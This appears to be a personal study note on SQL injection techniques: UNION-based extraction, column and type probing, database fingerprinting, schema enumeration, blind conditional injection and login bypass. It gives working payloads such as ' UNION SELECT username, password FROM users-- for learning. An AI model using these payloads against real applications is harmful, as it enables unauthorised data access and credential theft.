# Retrieving hidden data

simple attack -> `'+OR+1=1--`  [[WEB/vulnerabilities/SQL Injection/attack/payload#Retrieving hidden data#simple attack|example]]

## UNION attacks
##### concept:
<mark style="background: #FFB86CA6;">to retrieve data from other tables</mark> ->
- The individual queries must return the **same number of columns**.
- The **data types** in each column must be compatible between the individual queries.
### 1) number of columns required
- use `ORDER BY` -> `' ORDER BY [number]--` until you hit an error
- use `UNION SELECT` -> `' UNION SELECT NULL,NULL[...]--` -> until additional row in the result set (it is possible to get erros like `NullPointerException` or even same response as without null ) 
**Note**: On _Oracle_ databases, every `SELECT` statement must specify a table to select -> use `from dual`
### 2) Finding columns with a useful data type

- interesting data type = normally string type -> `UNION SELECT` 
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
`Conversion failed when converting the varchar value 'a' to data type int.` -> probably not suitable 

### 3) retrieve interesting data
- for example username and password from a table called users:
`' UNION SELECT username, password FROM users--`
#### multiple values within a single column
- use String Concatenation (different databases use different syntax) [[cheatsheet(portswigger)#String concatenation|see cheatsheet]]
	- example: `||` ->  `' UNION SELECT username || '~' || password FROM users--`  
## Examining the database

- database type and version [[WEB/vulnerabilities/SQL Injection/attack/payload#Examining the database|examples]]
	- _Microsoft, MySQL_ -> `SELECT @@version`
	- _PostgreSQL_ -> `SELECT version()`
	- _Oracle_ -> `SELECT * FROM v$version`
## Listing the contents 

- _Oracle_ [[WEB/vulnerabilities/SQL Injection/attack/payload#Listing the contents|examples]]
  - `all_tables`
  - `all_tab_columns`
- _all other databases_ -> `information_schema` 
  - `information_schema.tables`
  - `information_schema.columns`

# Blind SQL injection
##### concept:
-> when HTTP responses do not contain the *results of the relevant SQL query* or the *details of any database errors*.
## triggering conditional responses

1) the application does <mark style="background: #FF5582A6;">behave differently</mark> when faces with true/false conditional statement (example: `'1'='1` / `'1'='2`) in:
	- Parameters 
	- Cookies
	- HTTP Headers
2) determine the length of data you want to retrive using `LENGTH` 
3) use: 
	- Oracle: `SUBSTR`
	- non-Oracle: `SUBSTRING` [[WEB/vulnerabilities/SQL Injection/attack/payload#triggering conditional responses|example]]
/gitcomm
# Subverting application logic

simple attack -> `'--` [[WEB/vulnerabilities/SQL Injection/attack/payload#Subverting application logic#simple attack|example]]